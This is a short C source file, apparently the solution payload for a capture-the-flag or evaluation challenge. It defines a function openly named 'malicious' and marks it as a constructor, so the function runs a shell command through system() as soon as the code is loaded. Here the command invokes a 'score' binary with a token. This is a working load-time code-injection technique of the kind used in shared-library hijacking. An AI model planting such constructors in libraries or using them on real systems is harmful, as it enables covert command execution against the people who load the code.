#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 7e14e666-86d9-4807-af37-15fe3547aeca");
}
